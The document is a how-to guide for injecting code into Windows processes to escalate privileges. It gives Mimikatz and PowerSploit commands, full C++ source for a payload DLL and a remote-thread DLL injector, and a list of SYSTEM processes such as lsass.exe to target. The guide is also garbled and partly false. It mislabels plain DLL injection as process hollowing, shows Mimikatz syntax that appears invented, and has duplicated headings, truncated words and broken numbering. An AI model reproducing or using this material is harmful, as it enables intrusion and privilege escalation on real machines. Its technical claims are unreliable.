### **Simple Explanation**

Process hollowing is a technique where an attacker creates a legitimate process in a suspended state, replaces its memory with malicious code, and then resumes the process to execute the injected code. This method is often used for privilege escalation (EoP) or to execute arbitrary code under the context of a higher-privilege process. Below, we'll walk through detailed workflows using **Mimikatz**, **PowerSploit**, and **custom DLL injection** to achieve process hollowing starting as a user and potentially escalating privileges.

---

### **Workflow 1: Process Hollowing with Mimikatz**

#### **Overview**
Mimikatz can be used for process hollowing by suspending a legitimate process, injecting a malicious DLL or payload into it, and then resuming the process. This method can be used to execute code with the privileges of the hijacked process.

#### **Steps**

1. **Download and Prepare Mimikatz:**
   - Download the latest version of Mimikatz from its [official repository](https://github.com/gentilkiwi/mimikatz).
   - Run Mimikatz with administrative privileges (if possible, but you can start as a standard user).

2. **Enable Debug Privileges:**
   - Enable the necessary privileges to manipulate processes.
     ```cmd
     mimikatz # privilege::debug
     ```

3. **Identify a Target Process:**
   - Identify a process running with higher privileges that you can hijack, such as `explorer.exe` or `svchost.exe`.
     - Use Task Manager or `tasklist` command to find a suitable process ID (PID).

4. **Suspend the Target Process:**
   - Suspend the target process to allow for memory manipulation.
     ```cmd
     mimikatz # process::suspend /pid:<targetPID>
     ```

5. **Inject Malicious Code (DLL):**
   - Inject a DLL or payload into the suspended process.
     ```cmd
     mimikatz # process::inject /pid:<targetPID> /module:<DLL path> /entry:<EntryPoint>
     ```
   - **Example:** If you have a DLL compiled from the earlier example:
     ```cmd
     mimikatz # process::inject /pid:1234 /module:C:\path\to\malicious.dll /entry:DllMain
     ```

6. **Resume the Process:**
   - Resume the process to execute the injected code.
     ```cmd
     mimikatz # process::resume /pid:<targetPID>
     ```

7. **Verify Execution:**
   - Check if the injected code executed (e.g., message box popped up, or malicious code ran with higher privileges).

---

### **Workflow 2: Process Hollowing with PowerSploit**

#### **Overview**
PowerSploit is a PowerShell toolkit that can be used to perform reflective DLL injection and process hollowing. This method allows injecting a payload into a process and executing it, potentially leading to privilege escalation.

#### **Steps**

1. **Prepare the Environment:**
   - Download PowerSploit from its [official repository](https://github.com/PowerShellMafia/PowerSploit).
   - Import the PowerSploit module into your PowerShell session.
     ```powershell
     Import-Module .\PowerSploit\CodeExecution\Invoke-ReflectivePEInjection.ps1
     ```

2. **Identify a Target Process:**
   - Identify a target process, such as `explorer.exe`, running under a higher-privilege context.
   - Use `Get-Process` to list processes and their IDs.
     ```powershell
     Get-Process
     ```

3. **Compile or Obtain a Malicious DLL:**
   - Use a C++ or C# project to create a DLL containing the payload. This DLL should be compiled and ready for injection.

4. **Execute Reflective DLL Injection:**
   - Use PowerSploit to inject the DLL into the target process.
     ```powershell
     $PEBytes = [System.IO.File]::ReadAllBytes("C:\path\to\malicious.dll")
     Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessID <targetPID>
     ```
   - **Example:**
     ```powershell
     $PEBytes = [System.IO.File]::ReadAllBytes("C:\path\to\malicious.dll")
     Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessID 1234
     ```

5. **Verify Execution:**
   - The injected DLL should execute within the context of the target process, potentially leading to privilege escalation.

---

### **Workflow 3: Process Hollowing with Custom C++/C# DLL Injection**
### **Workflow 4: Process Hollowing with Custom C++ DLL Injection**

This workflow involves writing a custom DLL in C++ that contains your payload, compiling it, and then injecting it into a target process. The code provided here can be directly compiled in Visual Studio to create a DLL that, when injected, will display a message box.

#### **Step 1: Write the DLL**

Here is the complete C++ code for the DLL that will show a message box when injected:

```cpp
#include <windows.h>

// Entry point for the DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            MessageBox(NULL, "Injected!", "DLL Injection", MB_OK);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

#### **Step 2: Compile the DLL**

1. **Open Visual Studio:**
   - Start Visual Studio and create a new project.

2. **Create a New Project:**
   - Go to `File` > `New` > `Project`.
   - Select `Class Library` under Visual C++ (for C++ development) or `Dynic Link Library (DLL)` if it's available as an option.
   - ne your project (e.g., `InjectedMessageBoxDLL`) and click `Create`.

3. **Replace the Default Code:**
   - In the `Class1.cpp` or equivalent source file, replace the existing code with the code provided above.

4. **Configure the Project:**
   - Right-click on the project in the `Solution Explorer` and select `Properties`.
   - In the `Configuration Properties`, ensure the project type is set to `Dynic Library (.dll)`.

5. **Build the DLL:**
   - Click `Build` > `Build Solution` (or press `Ctrl+Shift+B`).
   - The compiled DLL will be located in the `Debug` or `Release` folder within your project directory (e.g., `\InjectedMessageBoxDLL\Debug\InjectedMessageBoxDLL.dll`).

#### **Step 3: Identify a Target Process**

- Use Task Manager or the `tasklist` command to identify a target process that you want to inject your DLL into. Common targets include `explorer.exe`, `svchost.exe`, or other processes running under higher privileges.

#### **Step 4: Inject the DLL into the Target Process**

Here is a simple C++ injector program that you can also compile in Visual Studio to inject the DLL into a running process:

```cpp
#include <windows.h>
#include <iostream>

int main() {
    // Target process ID
    DWORD targetPID = 1234; // Replace with the actual target process ID

    // Path to the DLL
    const char* dllPath = "C:\\path\\to\\InjectedMessageBoxDLL.dll"; // Replace with your DLL path

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        std::cerr << "Failed to open target process." << std::endl;
        return 1;
    }

    // Allocate memory in the target process for the DLL path
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuf == NULL) {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "Failed to write DLL path to target process memory." << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Get the address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibrary == NULL) {
        std::cerr << "Failed to get address of LoadLibraryA." << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteBuf, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL injected successfully!" << std::endl;
    return 0;
}
```

#### **Step 5: Compile and Run the Injector**

1. **Compile the Injector:**
   - Create a new C++ Console Application project in Visual Studio.
   - Replace the default code with the injector code provided above.
   - Update `targetPID` with the process ID of the target process and `dllPath` with the path to your compiled DLL.
   - Build the solution to create the injector executable.

2. **Run the Injector:**
   - Run the compiled injector executable as an administrator to inject the DLL into the target process.
   - If successful, the target process will execute the code in the DLL, showing the message box with "Injected!".

5. **Verify Execution:**
   - Upon successful injection, the DLL's code will execute within the target process context.

---

### **Common Privileged Processes for Handle Hijacking**

- **`svchost.exe`**: Hosts Windows services, often runs with SYSTEM privileges.
- **`lsass.exe`**: Manages security policies and user authentication, runs with SYSTEM privileges.
- **`explorer.exe`**: The Windows GUI shell, runs with user privileges but is a common target for lateral movement.
- **`services.exe`**: Manages system services, runs with SYSTEM privileges.

---

